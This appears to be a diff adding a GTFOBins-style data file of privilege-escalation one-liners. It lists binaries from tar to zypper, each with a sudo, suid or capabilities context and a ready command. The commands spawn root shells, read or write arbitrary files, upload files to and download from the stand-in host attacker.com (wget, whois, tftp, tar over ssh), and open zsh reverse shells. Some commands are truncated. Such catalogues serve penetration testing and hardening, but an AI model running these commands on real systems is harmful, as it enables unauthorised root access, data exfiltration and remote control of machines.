+tar|suid|shell|./echo '/bin/sh 0<&1' >/path/to/temp-file
+tar|suid|shell|./tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar|suid|shell|tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+tar|suid|file-write|./echo DATA >/path/to/temp-file
+tar|suid|file-read|./tar cf /dev/stdout /path/to/input-file -I 'tar xO'
+tar|suid|upload|./tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+tar|suid|download|./tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
+task|sudo|shell|sudo task execute /bin/sh
+task|suid|shell|./task execute /bin/sh
+taskset|sudo|shell|sudo taskset 1 /bin/sh
+tasksh|sudo|shell|sudo tasksh
+tasksh|suid|shell|./tasksh
+tbl|sudo|file-read|sudo tbl /path/to/input-file
+tbl|suid|file-read|./tbl /path/to/input-file
+tclsh|sudo|library-load|sudo tclsh
+tclsh|suid|library-load|./tclsh
+tclsh|capabilities|library-load|tclsh
+tcpdump|sudo|command|echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root
+tcpdump|sudo|command|sudo tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command
+tcpdump|sudo|file-write|sudo tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user
+tcpdump|suid|file-write|./tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user
+tcsh|sudo|shell|sudo tcsh
+tcsh|sudo|file-write|sudo tcsh -c 'echo DATA >/path/to/output-file'
+tcsh|suid|shell|tcsh -b
+tcsh|suid|file-write|tcsh -bc 'echo DATA >/path/to/output-file'
+tdbtool|sudo|shell|sudo tdbtool
+tdbtool|suid|shell|./tdbtool
+tee|sudo|file-write|sudo echo DATA   tee /path/to/output-file
+tee|suid|file-write|./echo DATA   tee /path/to/output-file
+telnet|sudo|shell|sudo telnet
+telnet|sudo|reverse-shell|sudo mkfifo /path/to/temp-socket
+telnet|suid|shell|./telnet
+telnet|suid|reverse-shell|./mkfifo /path/to/temp-socket
+terraform|sudo|file-read|sudo terraform console
+terraform|suid|file-read|./terraform console
+tex|sudo|shell|sudo tex --shell-escape '\immediate\write18{/bin/sh}'
+tex|suid|shell|./tex --shell-escape '\immediate\write18{/bin/sh}'
+tftp|sudo|download|sudo tftp attacker.com
+tftp|suid|download|./tftp attacker.com
+tic|sudo|file-read|sudo tic -C /path/to/input-file
+tic|suid|file-read|./tic -C /path/to/input-file
+time|sudo|shell|sudo time /bin/sh
+time|suid|shell|time /bin/sh -p
+timedatectl|sudo|inherit|sudo timedatectl list-timezones
+timeout|sudo|shell|sudo timeout 0 /bin/sh
+timeout|suid|shell|timeout 0 /bin/sh -p
+tmate|sudo|shell|sudo tmate -c /bin/sh
+tmate|suid|shell|./tmate -c /bin/sh
+tmux|sudo|shell|sudo tmux -S /path/to/socket
+tmux|sudo|shell|sudo tmux -c /bin/sh
+tmux|sudo|file-read|sudo tmux -f /path/to/input-file
+tmux|suid|shell|./tmux -S /path/to/socket
+tmux|suid|shell|./tmux -c /bin/sh
+tmux|suid|file-read|./tmux -f /path/to/input-file
+top|sudo|shell|sudo echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
+torify|sudo|shell|sudo torify /bin/sh
+torsocks|sudo|shell|sudo torsocks /bin/sh
+troff|sudo|file-read|sudo troff /path/to/input-file
+troff|suid|file-read|./troff /path/to/input-file
+tsc|sudo|file-write|sudo tsc /path/to/input-file.ts --outFile /path/to/output-file
+tsc|sudo|file-read|sudo tsc /path/to/input-file.ts
+tshark|sudo|inherit|sudo echo '...' >/path/to/temp-file
+ul|sudo|file-read|sudo ul /path/to/input-file
+ul|suid|file-read|./ul /path/to/input-file
+unexpand|sudo|file-read|sudo unexpand -t999 /path/to/input-file
+unexpand|suid|file-read|./unexpand -t999 /path/to/input-file
+uniq|sudo|file-read|sudo uniq /path/to/input-file
+uniq|suid|file-read|./uniq /path/to/input-file
+unshare|sudo|shell|sudo unshare /bin/sh
+unshare|suid|shell|unshare -r /bin/sh
+unsquashfs|sudo|privilege-escalation|sudo unsquashfs shell
+unsquashfs|suid|privilege-escalation|./unsquashfs shell
+unzip|sudo|privilege-escalation|sudo unzip -K shell.zip
+unzip|suid|privilege-escalation|./unzip -K shell.zip
+update-alternatives|sudo|file-write|sudo echo DATA >/path/to/temp-file
+update-alternatives|suid|file-write|./echo DATA >/path/to/temp-file
+urlget|sudo|file-read|sudo urlget - /path/to/input-file
+urlget|suid|file-read|./urlget - /path/to/input-file
+uuencode|sudo|file-read|sudo uuencode /path/to/input-file /dev/stdout   uudecode
+uuencode|suid|file-read|./uuencode /path/to/input-file /dev/stdout   uudecode
+uv|sudo|shell|sudo uv run /bin/sh
+vagrant|sudo|inherit|sudo echo '...' >Vagrantfile
+valgrind|sudo|shell|sudo valgrind /bin/sh
+varnishncsa|sudo|file-write|sudo varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
+varnishncsa|suid|file-write|./varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
+vi|sudo|shell|sudo vi -c ':!/bin/sh' /dev/null
+vi|sudo|shell|sudo vi -c ':set shell=/bin/sh   shell'
+vi|sudo|shell|sudo vi -c ':shell'
+vi|sudo|shell|sudo vi -c :terminal /bin/sh
+vi|sudo|file-write|sudo vi /path/to/output-file
+vi|sudo|file-read|sudo vi /path/to/input-file
+vi|suid|shell|./vi -c ':!/bin/sh' /dev/null
+vi|suid|shell|./vi -c ':shell'
+vi|suid|shell|vi -c ':set shell=/bin/sh\ -p   shell'
+vi|suid|shell|vi -c ':terminal /bin/sh -p'
+vi|suid|file-write|./vi /path/to/output-file
+vi|suid|file-read|./vi /path/to/input-file
+view|sudo|file-read|sudo vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+view|sudo|inherit|sudo vim
+view|sudo|inherit|sudo vim -c ':lua ...'
+view|sudo|inherit|sudo vim -c ':py ...'
+view|suid|file-read|./vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+view|suid|inherit|./vim
+view|suid|inherit|./vim -c ':lua ...'
+view|suid|inherit|./vim -c ':py ...'
+vigr|sudo|inherit|sudo vigr
+vigr|suid|inherit|./vigr
+vim|sudo|file-read|sudo vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+vim|sudo|inherit|sudo vim
+vim|sudo|inherit|sudo vim -c ':lua ...'
+vim|sudo|inherit|sudo vim -c ':py ...'
+vim|suid|file-read|./vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+vim|suid|inherit|./vim
+vim|suid|inherit|./vim -c ':lua ...'
+vim|suid|inherit|./vim -c ':py ...'
+vimdiff|sudo|file-read|sudo vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+vimdiff|sudo|inherit|sudo vim
+vimdiff|sudo|inherit|sudo vim -c ':lua ...'
+vimdiff|sudo|inherit|sudo vim -c ':py ...'
+vimdiff|suid|file-read|./vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+vimdiff|suid|inherit|./vim
+vimdiff|suid|inherit|./vim -c ':lua ...'
+vimdiff|suid|inherit|./vim -c ':py ...'
+vipw|sudo|inherit|sudo vipw
+vipw|suid|inherit|./vipw
+virsh|sudo|command|sudo cat >/path/to/temp-file.xml <<EOF
+virsh|sudo|file-write|sudo echo DATA >/path/to/temp-file
+virsh|sudo|file-write|sudo virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
+volatility|sudo|inherit|sudo volatility -f /path/to/core-dump volshell
+volatility|suid|inherit|./volatility -f /path/to/core-dump volshell
+w3m|sudo|file-read|sudo w3m -dump /path/to/input-file
+w3m|suid|file-read|./w3m -dump /path/to/input-file
+wall|sudo|file-read|sudo wall --nobanner /path/to/input-file
+watch|sudo|shell|sudo watch 'reset; exec /bin/sh 1>&0 2>&0'
+watch|sudo|shell|sudo watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
+watch|suid|shell|./watch 'reset; exec /bin/sh 1>&0 2>&0'
+watch|suid|shell|watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
+wc|sudo|file-read|sudo wc --files0-from /path/to/input-file
+wc|suid|file-read|./wc --files0-from /path/to/input-file
+wg-quick|sudo|shell|sudo cat >/path/to/temp-file.conf <<EOF
+wget|sudo|shell|sudo echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
+wget|sudo|file-write|sudo wget -i /path/to/input-file -o /path/to/output-file
+wget|sudo|file-read|sudo wget -i /path/to/input-file
+wget|sudo|upload|sudo wget --post-data=DATA http://attacker.com
+wget|sudo|upload|sudo wget --post-file=/path/to/input-file http://attacker.com
+wget|sudo|download|sudo wget http://attacker.com/path/to/input-file -O /path/to/output-file
+wget|suid|shell|echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file wget --use-askpass=/path/to/temp-file 0
+wget|suid|file-write|./wget -i /path/to/input-file -o /path/to/output-file
+wget|suid|file-read|./wget -i /path/to/input-file
+wget|suid|upload|./wget --post-data=DATA http://attacker.com
+wget|suid|upload|./wget --post-file=/path/to/input-file http://attacker.com
+wget|suid|download|./wget http://attacker.com/path/to/input-file -O /path/to/output-file
+whiptail|sudo|file-read|sudo whiptail --textbox --scrolltext /path/to/input-file 0 0
+whiptail|suid|file-read|./whiptail --textbox --scrolltext /path/to/input-file 0 0
+whois|sudo|upload|sudo whois -h attacker.com -p 12345 DATA
+whois|sudo|download|sudo whois -h attacker.com -p 12345 x
+whois|suid|upload|./whois -h attacker.com -p 12345 DATA
+whois|suid|download|./whois -h attacker.com -p 12345 x
+wireshark|sudo|file-write|sudo wireshark -c 1 -i lo -k -f 'udp port 12345' &
+wireshark|sudo|inherit|sudo wireshark
+wish|sudo|inherit|sudo wish
+wish|suid|inherit|./wish
+xargs|sudo|shell|sudo echo x   xargs -o -a /dev/null /bin/sh
+xargs|sudo|shell|sudo xargs -a /dev/null /bin/sh
+xargs|sudo|file-read|sudo xargs -a /path/to/input-file -0
+xargs|suid|shell|echo x   xargs -o -a /dev/null /bin/sh -p
+xargs|suid|shell|xargs -a /dev/null /bin/sh -p
+xargs|suid|file-read|./xargs -a /path/to/input-file -0
+xdg-user-dir|sudo|shell|sudo xdg-user-dir '}; /bin/sh #'
+xdotool|sudo|shell|sudo xdotool exec --sync /bin/sh
+xdotool|suid|shell|xdotool exec --sync /bin/sh -p
+xelatex|sudo|shell|sudo latex --shell-escape '\immediate\write18{/bin/sh}'
+xelatex|sudo|file-write|sudo latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+xelatex|sudo|file-read|sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+xelatex|suid|shell|./latex --shell-escape '\immediate\write18{/bin/sh}'
+xelatex|suid|file-write|./latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+xelatex|suid|file-read|./latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+xetex|sudo|shell|sudo tex --shell-escape '\immediate\write18{/bin/sh}'
+xetex|suid|shell|./tex --shell-escape '\immediate\write18{/bin/sh}'
+xmodmap|sudo|file-read|sudo xmodmap -v /path/to/input-file
+xmodmap|suid|file-read|./xmodmap -v /path/to/input-file
+xmore|sudo|file-read|sudo xmore /path/to/input-file
+xmore|suid|file-read|./xmore /path/to/input-file
+xpad|sudo|file-read|sudo xpad -f /path/to/input-file
+xpad|suid|file-read|./xpad -f /path/to/input-file
+xxd|sudo|file-write|sudo echo DATA   xxd   xxd -r - /path/to/output-file
+xxd|sudo|file-read|sudo xxd /path/to/input-file   xxd -r
+xxd|suid|file-write|./echo DATA   xxd   xxd -r - /path/to/output-file
+xxd|suid|file-read|./xxd /path/to/input-file   xxd -r
+xz|sudo|file-read|sudo xz -c /path/to/input-file   xz -d
+xz|suid|file-read|./xz -c /path/to/input-file   xz -d
+yarn|sudo|shell|sudo echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
+yarn|sudo|shell|sudo echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
+yarn|sudo|shell|sudo yarn exec /bin/sh
+yash|sudo|shell|sudo yash
+yash|suid|shell|./yash
+yelp|sudo|file-read|sudo yelp man:/path/to/input-file
+yt-dlp|sudo|shell|sudo yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
+yum|sudo|command|sudo yum localinstall -y x-1.0-1.noarch.rpm
+yum|sudo|download|sudo yum install http://attacker.com/path/to/input-file.rpm
+yum|sudo|inherit|sudo cat >/path/to/temp-dir/x<<EOF
+zathura|sudo|shell|sudo zathura
+zcat|sudo|file-read|sudo zcat -f /path/to/input-file
+zgrep|sudo|file-read|sudo grep '' /path/to/input-file
+zic|sudo|command|sudo echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
+zic|suid|command|./echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
+zip|sudo|shell|sudo zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
+zip|sudo|file-read|sudo zip /path/to/temp-file /path/to/input-file
+zip|suid|shell|./zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
+zip|suid|file-read|./zip /path/to/temp-file /path/to/input-file
+zless|sudo|inherit|sudo zless /path/to/input-file
+zless|suid|inherit|./zless /path/to/input-file
+zsh|sudo|shell|sudo zsh
+zsh|sudo|reverse-shell|sudo zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+zsh|sudo|file-write|sudo zsh -c 'echo DATA >/path/to/output-file'
+zsh|sudo|file-read|sudo zsh -c '</path/to/input-file'
+zsh|sudo|file-read|sudo zsh -c 'echo "$(</path/to/input-file)"'
+zsh|sudo|upload|sudo zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
+zsh|sudo|download|sudo zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
+zsh|sudo|inherit|sudo zsh -c '</etc/hosts'
+zsh|suid|shell|./zsh
+zsh|suid|reverse-shell|./zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+zsh|suid|file-write|./zsh -c 'echo DATA >/path/to/output-file'
+zsh|suid|file-read|./zsh -c '</path/to/input-file'
+zsh|suid|file-read|./zsh -c 'echo "$(</path/to/input-file)"'
+zsh|suid|upload|./zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
+zsh|suid|download|./zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
+zsh|suid|inherit|./zsh -c '</etc/hosts'
+zsoelim|sudo|file-read|sudo zsoelim /path/to/input-file
+zsoelim|suid|file-read|./zsoelim /path/to/input-file
+zypper|sudo|shell|sudo cp /bin/sh /path/to/temp-dir/zypper-x
+zypper|sudo|shell|sudo cp /bin/sh /usr/lib/zypper/commands/zypper-x
